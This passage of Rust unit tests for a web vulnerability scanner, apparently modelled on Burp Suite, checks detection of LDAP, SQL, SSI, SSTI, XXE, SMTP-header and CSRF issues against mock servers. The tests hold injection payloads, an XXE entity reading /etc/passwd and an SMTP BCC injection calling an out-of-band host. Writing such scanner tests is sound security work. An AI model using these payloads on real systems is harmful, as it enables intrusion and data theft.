        assert!(invalid[0].starts_with("img/...") );
        assert!(file_path_variants("noslash.txt").unwrap().0.is_empty());
    }

    #[test]
    fn file_path_manip_detects_a_file_selector() {
        // A handler that serves <file> relative to a dir: valid paths hit the
        // real file, bogus ones 404. Burp differential must report.
        let serve = |p: &str| -> Option<Vec<u8>> {
            // Resolve "." segments; any other path maps to its literal segments.
            let resolved: Vec<&str> = p.split(['/', '\\']).filter(|s| !s.is_empty() && *s != ".").collect();
            let body = if resolved == ["img", "logo.png"] {
                "PNG image data ".repeat(20)
            } else {
                "<h1>404 Not Found</h1>".to_string()
            };
            Some(format!("HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{body}", body.len()).into_bytes())
        };
        let baseline = serve("img/logo.png").unwrap();
        assert!(run_file_path_manip_check("img/logo.png", &baseline, crate::variations::Accuracy::Normal, serve).is_some());
        // A page that ignores the value: no report.
        let fixed = |_: &str| Some(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok".to_vec());
        assert!(run_file_path_manip_check("img/logo.png", &fixed(""[..].as_ref()).unwrap(), crate::variations::Accuracy::Normal, fixed).is_none());
    }

    #[test]
    fn ssi_check_detects_processed_directives() {
        let (payload, _expected) = ssi_payload("abc0123456");
        assert!(payload.starts_with("<!--#set var="));
        assert!(payload.contains("#echo var="));
        let ssi = move |p: &str| {
            let mut vars = std::collections::HashMap::new();
            let re_set = regex::Regex::new("<!--#set var=\"([^\"]*)\" value=\"([^\"]*)\"-->").unwrap();
            for c in re_set.captures_iter(p) {
                vars.insert(c[1].to_string(), c[2].to_string());
            }
            let re_echo = regex::Regex::new("<!--#echo var=\"([^\"]*)\"-->").unwrap();
            let mut out = String::new();
            for c in re_echo.captures_iter(p) {
                out.push_str(vars.get(&c[1]).map(String::as_str).unwrap_or(""));
            }
            Some(format!("<html>{out}</html>"))
        };
        assert!(run_ssi_check("q", ssi).expect("processed SSI must report").payload.contains("#echo"));
        assert!(run_ssi_check("q", |p| Some(format!("<html>{p}</html>"))).is_none());
        assert!(run_ssi_check("q", |_| Some("<html>ok</html>".into())).is_none());
    }

    #[test]
    fn ssti_check_detects_evaluation_not_echo() {
        // A template engine that evaluates {{N*N}} and ${...} expressions.
        let engine = |p: &str| -> Option<String> {
            let mut out = p.to_string();
            // {{a*b}}, {a*b}, #{a*b}, %{a*b}, [[a*b]], ${a*b}
            let re = regex::Regex::new(r"[{%#\[]{1,2}(\d+)\*'?(\d+)'?[}%#\]]{1,2}").unwrap();
            for c in re.captures_iter(p) {
                let (x, y): (i64, i64) = (c[1].parse().unwrap(), c[2].parse().unwrap());
                out = out.replace(&c[0], &(x * y).to_string());
            }
            out = out.replace("{*commentedout*}", "").replace("{#commentedout#}", "");
            out = out.replace("${''.class}", "class java.lang.String").replace("${os.arch}", "amd64").replace("${file.separator}", "/");
            Some(out)
        };
        let hit = run_ssti_check("q", engine).expect("evaluation must report");
        assert!(!hit.payload.is_empty());
        // A page that echoes the payload literally is not evaluation.
        assert!(run_ssti_check("q", |p| Some(p.to_string())).is_none());
        // A page that ignores the parameter: nothing.
        assert!(run_ssti_check("q", |_| Some("<html>ok</html>".into())).is_none());
    }

    #[test]
    fn ldap_payloads_and_applicability_match_burp() {
        assert_eq!(ldap_payload("*", 0), "*)(objectClass=*");
        assert_eq!(ldap_payload("*", 1), "*)(!(objectClass=*)");
        assert_eq!(ldap_payload("*", 2), "*)(!(!(objectClass=*))");
        assert_eq!(ldap_payload("*", 6), "*)(objectClass=*", "negation depth cycles mod 6");
        assert!(ldap_applicable("john.doe@example.com"));
        assert!(!ldap_applicable("TRUE"));
        assert!(!ldap_applicable("a/b"), "slash is outside Burp's allowed set");
        assert!(ldap_applicable("/x"), "the first char is not checked");
    }

    #[test]
    fn ldap_check_detects_a_filter_sink() {
        // A directory search page: lists people when the injected filter
        // matches, an empty list otherwise. Even negation depth matches.
        let page = |found: bool| -> Vec<u8> {
            let body = if found { "<ul><li>alice</li><li>bob</li></ul>" } else { "<p>No results</p>" };
            format!("HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{body}", body.len()).into_bytes()
        };
        let baseline = page(true);
        let hit = run_ldap_check("smith", &baseline, ScanSpeed::Normal, crate::variations::Accuracy::Normal, |p| {
            let negs = p.matches("!(").count();
            Some(page(negs % 2 == 0))
        })
        .expect("filter sink must report");
        assert!(hit.positive.ends_with(")(objectClass=*"));
        assert!(hit.negative.ends_with(")(!(objectClass=*)"));
        // A page that ignores the parameter: never reported.
        assert!(run_ldap_check("smith", &baseline, ScanSpeed::Normal, crate::variations::Accuracy::Normal, |_| Some(page(true))).is_none());
    }

    #[test]
    fn header_manipulation_hit_checks_body_and_headers() {
        let headers = vec![("Server".to_string(), "nginx".to_string())];
        assert!(is_header_manipulation_hit("user agent wb-fip-marker logged", &headers, "wb-fip-marker"));
        assert!(is_header_manipulation_hit(
            "no body hit",
            &[("Via".to_string(), "wb-fip-marker".to_string())],
            "wb-fip-marker"
        ));
        assert!(!is_header_manipulation_hit("nothing here", &headers, "wb-fip-marker"));
    }

    #[test]
    fn xxe_probe_matches_burp_zge7() {
        let body = "<?xml version=\"1.0\"?><root><a>1</a></root>";
        let (base, doc, points) = xxe_points(body);
        assert_eq!(points.len(), 1);
        assert_eq!(
            xxe_probe_at(&base, doc, points[0], "xxeabcde", 1),
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxeabcde SYSTEM \"file:///etc/passwd\"> ]><root><a>1&xxeabcde;</a></root>"
        );
        assert!(xxe_probe_at(&base, doc, points[0], "e", 3).contains("file:///etc/passwdX"));
        // burp.Zmku.ZY: the prolog is only skipped when the body starts with
        // <?xml (after whitespace); a stray ?> elsewhere is ignored.
        assert_eq!(xml_doc_start("  <?xml version=\"1.0\"?><r/>"), 23);
        assert_eq!(xml_doc_start("<r><a>x?></a></r>"), 0);
        // Leaf element values only, empty values included, attributes not.
        assert_eq!(xml_value_points("<r id=\"9\"><a>1</a><b></b><c x=\"y\"/></r>", 0, 10).len(), 2);
        // burp.Zmku.ZW: no element value -> <data></data> at the doc start.
        let (base, doc, points) = xxe_points("<root/>");
        assert_eq!(base, "<data></data><root/>");
        assert_eq!(xxe_probe_at(&base, doc, points[0], "e", 1), "<!DOCTYPE foo [<!ENTITY e SYSTEM \"file:///etc/passwd\"> ]><data>&e;</data><root/>");
        // Confirmed only when the X control stays clean.
        let hit = run_xxe_check(body, "", "xxeabcde", |b| {
            Some(if b.contains("file:///etc/passwd\"") { "root:x:0:0".into() } else { String::new() })
        })
        .unwrap();
        assert_eq!(hit.file, "/etc/passwd");
        assert!(run_xxe_check(body, "", "xxeabcde", |_| Some("root:x:0:0".into())).is_none());
        // The second element value is probed when the first does not hit.
        let two = "<r><a>1</a><b>2</b></r>";
        let hit = run_xxe_check(two, "", "e", |b| {
            Some(if b.contains("2&e;") && b.contains("passwd\"") { "root:x".into() } else { String::new() })
        });
        assert!(hit.is_some());
    }

    #[test]
    fn sql_error_check_follows_burp_ze() {
        let quotes = |p: &str| p.chars().rev().take_while(|c| *c == '\'').count();
        // A MySQL sink: odd quote counts break the statement.
        let mysql = |p: &str| Some(if quotes(p) % 2 == 1 { "You have an error in your SQL syntax near ''".to_string() } else { "ok".to_string() });
        let hit = run_sql_error_check("5", "ok", ScanSpeed::Normal, mysql).unwrap();
        assert_eq!((hit.database, hit.confirmed), ("MySQL", true));
        assert_eq!(hit.payload, "5'");
        // The error already on the baseline page: nothing.
        assert!(run_sql_error_check("5", "You have an error in your SQL syntax", ScanSpeed::Normal, mysql).is_none());
        // Generic SQLException needs the full alternation.
        assert!(run_sql_error_check("5", "", ScanSpeed::Normal, |_| Some("java.sql.SQLException".to_string())).is_none());
        let generic_alt = |p: &str| Some(if quotes(p) % 2 == 1 { "SQLException".to_string() } else { String::new() });
        assert_eq!(run_sql_error_check("5", "", ScanSpeed::Normal, generic_alt).unwrap().database, "Generic");
        // Juice Shop's SQLite sink: no database signature, but a 500 page
        // saying "Error" on odd quote counts (Burp: "general error message").
        let sqlite = |p: &str| {
            Some(if quotes(p) % 2 == 1 {
                "HTTP/1.1 500 Internal Server Error\r\n\r\n<title>Error: SQLITE_ERROR: near \"'%'\": syntax error</title>".to_string()
            } else {
                "HTTP/1.1 200 OK\r\n\r\n{\"status\":\"success\",\"data\":[]}".to_string()
            })
        };
        let base = "HTTP/1.1 200 OK\r\n\r\n{\"status\":\"success\",\"data\":[1]}";
        let hit = run_sql_error_check("apple", base, ScanSpeed::Normal, sqlite).expect("general error");
        assert_eq!((hit.database, hit.confirmed), ("General", true));
        // A page that always errors is not an injection.
        assert!(run_sql_error_check("apple", base, ScanSpeed::Normal, |_| Some("HTTP/1.1 500 X\r\n\r\nerror".to_string())).is_none());
    }

    #[test]
    fn sql_boolean_payloads_match_burp_zguq() {
        let mut g = SqlBoolGen::new(SqlBoolShape::Or, "'");
        assert_eq!(g.positive_with(12345678, 1234), "12345678' or '1234'='1234");
        assert_eq!(g.negative_with(12345678, 2000, 3), "12345678' or '2000'='2003");
        assert_eq!(g.negative_with(12345678, 2000, 3), "12345678' or '2000'='2000'", "every 4th negative, quoted");
        let mut u = SqlBoolGen::new(SqlBoolShape::OrComment, "");
        assert_eq!(u.positive_with(1, 1234), "1 or 1234=01234-- ", "first unquoted positive uses 0n");
        assert_eq!(u.positive_with(1, 1234), "1 or 1234=1234-- ");
        let mut a = SqlBoolGen::new(SqlBoolShape::And, "'");
        assert_eq!(a.positive_with(9, 5555), "' and '5555'='5555");
        let mut c = SqlBoolGen::new(SqlBoolShape::AndComment, "");
        c.negative_with(9, 1500, 2);
        assert_eq!(c.negative_with(9, 1500, 2), " and 1500=15000-- ", "every 4th negative, unquoted");
    }

    #[test]
    fn sql_boolean_check_detects_a_quoted_sink() {
        // `SELECT .. WHERE name = '<value>'`: a tautology after a closed
        // quote returns every row, a contradiction returns none.
        let page = |rows: usize| -> Vec<u8> {
            let body = format!("<table>{}</table>", "<tr><td>row</td></tr>".repeat(rows));
            format!("HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{body}", body.len()).into_bytes()
        };
        let baseline = page(1);
        let sink = |p: &str| -> Option<Vec<u8>> {
            // The server appends the closing quote of `name = '<value>'`.
            let commented = p.ends_with("-- ");
            let full = if commented { p.trim_end_matches("-- ").to_string() } else { format!("{p}'") };
            let tail = full.split_once("' ").map(|(_, t)| t.to_string()).unwrap_or_default();
            let Some((l, r)) = tail.rsplit_once('=') else { return Some(page(1)) };
            let lit = |x: &str| -> Option<String> {
                let x = x.trim();
                match x.strip_prefix('\'').and_then(|y| y.strip_suffix('\'')) {
                    Some(inner) if inner.contains('\'') => None, // unbalanced: syntax error
                    Some(inner) => Some(inner.to_string()),
                    None if x.contains('\'') => None,
                    None => x.parse::<i64>().ok().map(|n| n.to_string()),
                }
            };
            let l = l.rsplit(' ').next().unwrap_or("");
            let rows = match (lit(l), lit(r)) {
                (Some(a), Some(b)) => {
                    let t = a == b || a.parse::<i64>().ok().zip(b.parse::<i64>().ok()).is_some_and(|(x, y)| x == y);
                    match (tail.starts_with("or"), t) {
                        (true, true) => 5,
                        (true, false) => 1,
                        (false, true) => 1,
                        (false, false) => 0,
                    }
                }
                _ => 0, // syntax error page
            };
            Some(page(rows))
        };
        let hit = run_sql_boolean_check("bob", &baseline, ScanSpeed::Normal, crate::variations::Accuracy::Normal, sink)
            .expect("quoted sink must report");
        assert!(hit.positive.starts_with("bob"));
        // An insensitive page never reports.
        assert!(run_sql_boolean_check("bob", &baseline, ScanSpeed::Normal, crate::variations::Accuracy::Normal, |_| Some(page(1))).is_none());
    }

    #[test]
    fn reflected_dom_requires_script_data_or_attribute_context() {
        const C: &str = "wb001dom";
        // Script data context: the canary lands inside an existing script block.
        assert!(is_reflected_dom_hit("<html><script>var q=\"wb001dom\";</script></html>", C));
        // Attribute-value context inside a tag.
        assert!(is_reflected_dom_hit("<img src=\"/logo.png\" alt=\"wb001dom\">", C));
        assert!(is_reflected_dom_hit("<a href='/page/wb001dom/view'>x</a>", C));
        // Bare text-node reflection is not a DOM-sink context.
        assert!(!is_reflected_dom_hit("<div>hello wb001dom world</div>", C));
        // A quoted attribute before the canary does not make the text a value.
        assert!(!is_reflected_dom_hit("<div class=\"a\">wb001dom</div>", C));
        // A numeric entity reflection is a different string: no hit.
        assert!(!is_reflected_dom_hit("<div>&#119;&#98;001dom</div>", C));
        // Canary absent: no hit.
        assert!(!is_reflected_dom_hit("<script>var q=\"other\";</script>", C));
        // Unclosed script tag: no region, no hit.
        assert!(!is_reflected_dom_hit("<script>var q=\"wb001dom\"", C));
        // Case-insensitive tag matching still finds script data.
        assert!(is_reflected_dom_hit("<SCRIPT>var q=\"wb001dom\";</SCRIPT>", C));
    }

    #[test]
    fn stored_echo_classifies_xss_dom_and_plain_input() {
        const M: &str = "wb000xss";
        // The persisted script-tag payload is the strongest signal.
        assert_eq!(stored_echo_hit("<ul><script>wb000xss</script></ul>", M), Some("xss"));
        // A dom canary landing in an attribute of a later page.
        assert_eq!(stored_echo_hit("<div title=\"wb001dom\">n</div>", "wb001dom"), Some("dom"));
        // A plain echo of the marker anywhere is stored input.
        assert_eq!(stored_echo_hit("<p>thanks wb000xss</p>", M), Some("input"));
        // Nothing survived: no signal.
        assert_eq!(stored_echo_hit("<p>ordinary page</p>", M), None);
        // Escaped echo of the script tag does not count as stored XSS.
        assert_eq!(stored_echo_hit("<p>&lt;script&gt;wb000xss&lt;/script&gt;</p>", M), Some("input"));
    }

    #[test]
    fn server_level_checks_trace_and_options() {
        // TRACE: a 200 that echoes the request line and headers back.
        assert!(is_trace_hit("200", "TRACE /index.html HTTP/1.1\r\nHost: h\r\n\r\n", "/index.html"));
        // A plain 200 page is not an echo.
        assert!(!is_trace_hit("200", "<html>ok</html>", "/index.html"));
        // 405 with an echo-less body: not a hit.
        assert!(!is_trace_hit("405", "TRACE /index.html HTTP/1.1\r\nHost: h", "/index.html"));
        // OPTIONS: only 2xx with risky methods in Allow counts.
        assert_eq!(risky_methods_allowed("200", Some("GET, POST, PUT, DELETE")), vec!["PUT", "DELETE"]);
        assert_eq!(risky_methods_allowed("200", Some("get, put")), vec!["PUT"], "case-insensitive");
        assert_eq!(risky_methods_allowed("200", Some("GET, POST")), Vec::<String>::new());
        assert_eq!(risky_methods_allowed("405", Some("PUT")), Vec::<String>::new(), "non-2xx never counts");
        assert_eq!(risky_methods_allowed("200", None), Vec::<String>::new(), "no Allow header");
    }

    /// Live end to end (network; `cargo test live_smtp_injection -- --ignored`):
    /// a real scan against a local "contact form" that builds mail headers
    /// from the `email` parameter and relays any injected BCC to the
    /// recipient domain's SMTP server. The public Collaborator (interactsh)
    /// must then report an SMTP interaction for the payload id, of kind SMTP.
    #[test]
    #[ignore]
    fn live_smtp_injection_end_to_end() {
        use std::io::{Read, Write};
        let mut collab = crate::collaborator::CollaboratorState::new();
        let server = collab.start_remote(crate::interactsh::DEFAULT_SERVERS[0]).expect("register");
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        std::thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(mut s) = stream else { continue };
                let mut buf = vec![0u8; 16384];
                let n = s.read(&mut buf).unwrap_or(0);
                let head = String::from_utf8_lossy(&buf[..n]).to_string();
                let target = head.split_whitespace().nth(1).unwrap_or("/").to_string();
                let email = target
                    .split_once("email=")
                    .map(|(_, v)| String::from_utf8_lossy(&pct_decode(v.split('&').next().unwrap_or(""))).into_owned())
                    .unwrap_or_default();
                // The vulnerable mailer: header lines come from user input.
                for line in email.split("\r\n") {
                    if let Some(rcpt) = line.strip_prefix("BCC:") {
                        let domain = rcpt.rsplit('@').next().unwrap_or("");
                        if let Ok(mut m) = std::net::TcpStream::connect((domain, 25)) {
                            m.set_read_timeout(Some(std::time::Duration::from_secs(10))).ok();
                            let mut b = [0u8; 512];
                            for cmd in ["".to_string(), "EHLO shop.test\r\n".into(), "MAIL FROM:<shop@shop.test>\r\n".into(),
                                        format!("RCPT TO:<{rcpt}>\r\n"), "DATA\r\n".into(), "Subject: hi\r\n\r\nthanks\r\n.\r\n".into(), "QUIT\r\n".into()] {
                                if !cmd.is_empty() { let _ = m.write_all(cmd.as_bytes()); }
                                let _ = m.read(&mut b);
                            }
                        }
                    }
                }
                let body = "<html>thanks</html>";
                let _ = s.write_all(format!("HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}", body.len()).as_bytes());
            }
        });
        let shared = net::Shared::new();
        let path = "/contact?email=a@b.c";
        let req = format!("GET {path} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n\r\n");
        let entry = HistEntry {
            id: 1, ts: 0, method: "GET".into(), host: "127.0.0.1".into(), port, https: false, path: path.into(),
            status: "200".into(), resp_len: 0, req_raw: req.into_bytes().into(), resp_raw: None, note: None, highlight: None, audited: false, params: true,
            edited: false, extension: String::new(), title: String::new(), cookies: String::new(), listener_port: 0,
            ip: String::new(), diffs: 0,
        };
        let a = collab.generate_payload();
        let b = collab.generate_payload();
        assert!(a.dns_name.ends_with(&server));
        let plan = vec![SmtpOob { param: "email".into(), simple: (a.token.clone(), a.dns_name), enclosed: (b.token.clone(), b.dns_name) }];
        start_active_scan(shared.clone(), entry, &[], &plan);
        let t0 = std::time::Instant::now();
        while shared.scan.is_busy() && t0.elapsed() < std::time::Duration::from_secs(120) {
            std::thread::sleep(std::time::Duration::from_millis(200));
        }
        let pending: Vec<_> = shared.oob.pending().iter().map(|(t, k, _)| (t.clone(), *k)).collect();
        assert!(pending.contains(&(a.token.clone(), Some("SMTP"))), "pending: {pending:?}");
        let mut hit = false;
        for _ in 0..15 {
            std::thread::sleep(std::time::Duration::from_secs(3));
            hit = collab.interactions().iter().any(|i| {
                i.kind() == crate::collaborator::InteractionKind::Smtp && i.token.as_deref() == Some(a.token.as_str())
            });
            if hit {
                break;
            }
        }
        collab.stop_remote();
        assert!(hit, "no SMTP interaction for {}: {:?}", a.token, collab.interactions().iter().map(|i| (i.kind().label(), i.token.clone())).collect::<Vec<_>>());
    }

    #[test]
    fn smtp_payload_matches_burp_zrok() {
        assert_eq!(
            smtp_payload("a@b.c", false, "id1.oast.pro", "xyz", "q"),
            "a@b.c\r\nBCC:user@id1.oast.pro\r\nxyz: q"
        );
        assert_eq!(
            smtp_payload("a@b.c", true, "id2.oast.pro", "xyz", "q"),
            "a@b.c>\r\nBCC:user@id2.oast.pro\r\nxyz: q"
        );
        // On the wire the CR/LF are percent-encoded in the query value.
        assert!(encode_query_payload(&smtp_payload("v", false, "h", "abc", "d")).contains("%0D%0ABCC:user@h%0D%0A"));
    }

    #[test]
    fn csrf_token_names_follow_the_jar_tables() {
        // Exact names from burp.Zhq6 / burp.Zg8w (all with a realistic value,
        // since Zg8w.Zi gates on the VALUE being >= 6 characters).
        for n in [
            "authenticity_token",
            "csrfmiddlewaretoken",
            "csrf_token",
            "xsrf_token",
            "_csrf",
            "__RequestVerificationToken",
        ] {
            assert!(is_csrf_token_param(n, "aa1122334455"), "{n} must be a token name");
        }
        // Substring families (burp.Zg8w.ZY/ZI).
        for n in ["user_csrf", "XSRF-TOKEN", "gaAuthnNonce", "antiforgeryfield", "SynchronizerToken"] {
            assert!(is_csrf_token_param(n, "aa1122334455"), "{n} must match a token-name family");
        }
        // Short VALUES are excluded by the same guard Burp applies
        // (burp.Zg8w.Zi: name value length < 6 is never a token).
        assert!(!is_csrf_token_param("csrf_token", "abc"), "short token value is not a token");
        assert!(!is_csrf_token_param("csrf_token", ""), "empty value is not a token");
        // Ordinary parameters must never be stripped.
        for n in ["email", "password", "q", "username"] {
            assert!(!is_csrf_token_param(n, "someone@example.com"), "{n} must not be a token");
        }
    }

    #[test]
    fn csrf_applicability_matches_zm9o() {
        let ct = [("Content-Type".to_string(), "application/x-www-form-urlencoded".to_string())];
        let with_x = [("X-Requested-With".to_string(), "XMLHttpRequest".to_string())];
        // POST + form body + no custom header: applicable.
        assert!(csrf_applicable("POST", "application/x-www-form-urlencoded", &ct));
        // GET can never be CSRF-able by a form post.
        assert!(!csrf_applicable("GET", "application/x-www-form-urlencoded", &ct));
        // JSON / multipart bodies: multipart is allowed, JSON is not.
        assert!(csrf_applicable("POST", "multipart/form-data; boundary=x", &ct));
        assert!(!csrf_applicable("POST", "application/json", &ct));
        // Any x-* header other than x-requested-with pre-flights the request.
        assert!(csrf_applicable("POST", "application/x-www-form-urlencoded", &with_x));
        let with_custom = [
            ("Content-Type".to_string(), "application/x-www-form-urlencoded".to_string()),
            ("X-Custom".to_string(), "1".to_string()),
        ];
        assert!(!csrf_applicable("POST", "application/x-www-form-urlencoded", &with_custom));
        // No Content-Type at all is still a plain form post.
        assert!(csrf_applicable("POST", "", &[]));
    }

    #[test]
    fn strip_csrf_params_removes_only_tokens() {
        let (kept, removed) = strip_csrf_params(
            "email=a%40b.c&authenticity_token=abc123&name=bob&csrf_token=deadbeef00",
        );
        assert_eq!(removed, vec!["authenticity_token", "csrf_token"]);
        assert_eq!(kept, "email=a%40b.c&name=bob");
        // A token-named field with a value shorter than 6 characters is an
        // ordinary field, not a token (burp.Zg8w.Zi guards on the value).
        let (kept3, removed3) = strip_csrf_params("csrf_token=zzz&email=a");
        assert!(removed3.is_empty(), "short token value must not be stripped");
        assert_eq!(kept3, "csrf_token=zzz&email=a");
        // No token present: the probe must not run.
        let (kept2, removed2) = strip_csrf_params("email=a&password=b");
        assert!(removed2.is_empty(), "no token means no probe");
        assert_eq!(kept2, "email=a&password=b");
    }

    #[test]
    fn blank_csrf_params_keeps_names_and_empties_values() {
        // Variant 2 keeps every field, only blanking token values (Zwfm:
        // "the request is successful if these parameters are assigned empty
        // values").
        let (body, names) =
            blank_csrf_params("email=a%40b.c&authenticity_token=abc123&name=bob&csrf_token=deadbeef00");
        assert_eq!(names, vec!["authenticity_token", "csrf_token"]);
        assert_eq!(body, "email=a%40b.c&authenticity_token=&name=bob&csrf_token=");
        // No token: nothing blanked, body untouched.
        let (body2, names2) = blank_csrf_params("email=a&password=b");
        assert!(names2.is_empty());
        assert_eq!(body2, "email=a&password=b");
    }

    #[test]
    fn form_token_value_reads_both_attribute_orders() {
        let html = r#"<form method="post">
            <input type="hidden" name="authenticity_token" value="tok-123456">
            <input type="text" name="email">
        </form>"#;
        assert_eq!(form_token_value(html, "authenticity_token").as_deref(), Some("tok-123456"));
        // value= before name= is also valid HTML.
        let html2 = r#"<input value="7f3d99aa00" type="hidden" name="csrf_token">"#;
        assert_eq!(form_token_value(html2, "csrf_token").as_deref(), Some("7f3d99aa00"));
        // Single-quoted attributes and no-quoted values.
        let html3 = "<input type=hidden name=csrf_token value='q9w8e7r6t5'>";
        assert_eq!(form_token_value(html3, "csrf_token").as_deref(), Some("q9w8e7r6t5"));
        // A name that merely contains the target must not match (regex is
        // anchored to the whole quoted attribute value).
        assert_eq!(form_token_value(html, "csrf_token"), None);
        assert_eq!(form_token_value("<p>nothing</p>", "authenticity_token"), None);
    }

    #[test]
    fn redirect_path_comparison_separates_login_bounces() {
        // A login URL that carries the original path in `next=` is still a
        // rejection — this is exactly what a keyword test gets wrong.
        assert!(!redirect_stays_on_path("https://h/login?next=/account", "/account"));
        assert_eq!(location_path("https://h/login?next=/account"), "/login");
        // A redirect that continues below the requested path is acceptance.
        assert!(redirect_stays_on_path("https://h/account/done", "/account"));
        // Exact same path.
        assert!(redirect_stays_on_path("/account", "/account"));
        // Scheme-relative and bare paths.
        assert!(!redirect_stays_on_path("//h/login", "/account"));
        assert!(!redirect_stays_on_path("/signin", "/account"));
        // A path that merely shares a prefix ("/accounts") is NOT the same
        // resource, and must not be treated as a continuation.
        assert!(!redirect_stays_on_path("/accounts", "/account"));
        // No Location: nothing to judge.
        assert!(redirect_stays_on_path("", "/account"));
    }

    #[test]
    fn csrf_hit_needs_a_successful_replay() {
        // Token stripped and the server still accepts: vulnerable.
        assert!(is_csrf_hit("200 OK", "200 OK", "", "/account"));
        assert!(is_csrf_hit("302 Found", "204 No Content", "", "/account"));
        // The baseline already failed: Burp skips these (Zg8u.ZN).
        assert!(!is_csrf_hit("403 Forbidden", "200 OK", "", "/account"));
        // The stripped replay was rejected.
        assert!(!is_csrf_hit("200 OK", "403 Forbidden", "", "/account"));
        assert!(!is_csrf_hit("200 OK", "500 Internal Server Error", "", "/account"));
        // Bounced to a login page instead of being accepted.
        assert!(!is_csrf_hit("200 OK", "302 Found", "https://h/login?next=/account", "/account"));
        // A redirect that stays on the requested path is still an acceptance.
        assert!(is_csrf_hit("200 OK", "302 Found", "https://h/account/done", "/account"));
    }

    const CLEAN_HEADERS: &[(&str, &str)] = &[
        ("Content-Type", "text/html; charset=utf-8"),
        ("Strict-Transport-Security", "max-age=31536000"),
        ("Content-Security-Policy", "default-src 'self'; frame-ancestors 'none'"),
        ("X-Content-Type-Options", "nosniff"),
        ("X-Frame-Options", "DENY"),
        ("Referrer-Policy", "no-referrer"),
        ("Permissions-Policy", "geolocation=()"),
        ("Cache-Control", "no-store"),
    ];

    fn resp(status: &str, headers: &[(&str, &str)], body: &str) -> String {
        let mut s = format!("HTTP/1.1 {status}\r\nContent-Length: {}\r\n", body.len());
        for (k, v) in headers {
            s.push_str(&format!("{k}: {v}\r\n"));
        }
        s.push_str("\r\n");
        s.push_str(body);
        s
    }

    fn clean() -> String {
        resp("200 OK", CLEAN_HEADERS, "<html><body>ok</body></html>")
    }

    fn entry(path: &str, https: bool, resp: &str) -> HistEntry {
        entry_origin(path, https, None, resp)
    }

    fn entry_origin(path: &str, https: bool, origin: Option<&str>, resp: &str) -> HistEntry {
        let mut req = format!("GET {path} HTTP/1.1\r\nHost: example.com\r\n");
        if let Some(o) = origin {
            req.push_str(&format!("Origin: {o}\r\n"));
        }
        req.push_str("\r\n");
        HistEntry {
            id: 1,
            ts: 0,
            method: "GET".into(),
            host: "example.com".into(),
            port: if https { 443 } else { 80 },
            https,
            path: path.into(),
            status: "200".into(),
            resp_len: resp.len(),
            req_raw: req.into_bytes().into(),
            resp_raw: Some(resp.as_bytes().to_vec().into()),
            note: None,
            highlight: None,
            audited: false,
            params: false,
            edited: false,
            extension: String::new(),
            title: String::new(),
            cookies: String::new(),
            listener_port: 0,
            ip: String::new(),
            diffs: 0,
        }
    }

    fn has(v: &[ScanIssue], c: CheckDef) -> bool {
        v.iter().any(|i| i.name == c.name && i.sev == c.sev)
    }

    #[test]
    fn check_library_has_unique_stable_ids() {
        let lib = check_library();
        assert_eq!(lib.len(), 35);
        let mut ids = std::collections::BTreeSet::new();
        for c in lib {
            assert!(c.id.starts_with("passive."), "{}", c.id);
            assert!(ids.insert(c.id), "duplicate id {}", c.id);
            assert!(!c.name.is_empty());
            assert!(["high", "medium", "low", "info"].contains(&c.sev), "{}", c.sev);
            assert!(["Certain", "Firm", "Tentative"].contains(&c.confidence), "{}", c.confidence);
        }
    }

    #[test]
    fn clean_https_response_produces_no_issues() {
        let v = passive_check(&entry("/", true, &clean()));
        assert!(v.is_empty(), "unexpected: {:?}", v.iter().map(|i| &i.name).collect::<Vec<_>>());
    }

    #[test]
    fn unencrypted_communications_only_over_http() {
        // plain HTTP: reported
        assert!(has(&passive_check(&entry("/", false, &clean())), CH_CLEARTEXT));
        // HTTPS: not reported
        assert!(!has(&passive_check(&entry("/", true, &clean())), CH_CLEARTEXT));
    }

    #[test]
    fn hsts_is_only_reported_over_https() {
        let no_hsts: Vec<_> = CLEAN_HEADERS.iter().copied().filter(|(k, _)| *k != "Strict-Transport-Security").collect();
        let body = "<html><body>ok</body></html>";
        // positive: an HTTPS origin without the header
        assert!(has(&passive_check(&entry("/", true, &resp("200 OK", &no_hsts, body))), CH_HSTS));
        // negative: plain HTTP cannot enforce HSTS, so the check stays quiet
        assert!(!has(&passive_check(&entry("/", false, &resp("200 OK", &no_hsts, body))), CH_HSTS));
        // negative: the header is present
        assert!(!has(&passive_check(&entry("/", true, &clean())), CH_HSTS));
    }

    #[test]
    fn every_missing_security_header_is_a_separate_issue() {
        let bare = resp("200 OK", &[("Content-Type", "text/html")], "<html><a href=\"/x\">x</a></html>");
        let v = passive_check(&entry("/", true, &bare));
        for c in [CH_HSTS, CH_CSP, CH_FRAME, CH_XCTO, CH_REFERRER, CH_PERMISSIONS] {
            assert!(has(&v, c), "missing {}", c.id);
        }
        // one issue per header, not a lump: six distinct names
        let names: std::collections::BTreeSet<_> =
            v.iter().map(|i| i.name.as_str()).filter(|n| n.contains("header") || n.contains("policy") || n.contains("Frameable") || n.contains("transport")).collect();
        assert!(names.len() >= 6);
        // negative: the clean response reports none of them
        let clean_v = passive_check(&entry("/", true, &clean()));
        for c in [CH_HSTS, CH_CSP, CH_FRAME, CH_XCTO, CH_REFERRER, CH_PERMISSIONS] {
            assert!(!has(&clean_v, c), "false positive {}", c.id);
        }
    }

    /// burp.Zm7y: CSP frame-ancestors does not suppress the issue; a page
    /// without a URL-bearing element, a redirect, a POST and XFO DENY /
    /// SAMEORIGIN do.
    #[test]
    fn frameable_follows_burp_zm7y() {
        let h: Vec<_> = CLEAN_HEADERS.iter().copied().filter(|(k, _)| *k != "X-Frame-Options").collect();
        let linked = "<html><body><a href='/next'>n</a></body></html>";
        let v = passive_check(&entry("/", true, &resp("200 OK", &h, linked)));
        assert!(has(&v, CH_FRAME));
        assert_eq!(v.iter().find(|i| i.name == CH_FRAME.name).unwrap().sev, "info");
        assert!(!has(&passive_check(&entry("/", true, &resp("200 OK", &h, "<html><p>no links</p><abbr>x</abbr></html>"))), CH_FRAME));
        assert!(has(&passive_check(&entry("/", true, &resp("404 Not Found", &h, linked))), CH_FRAME));
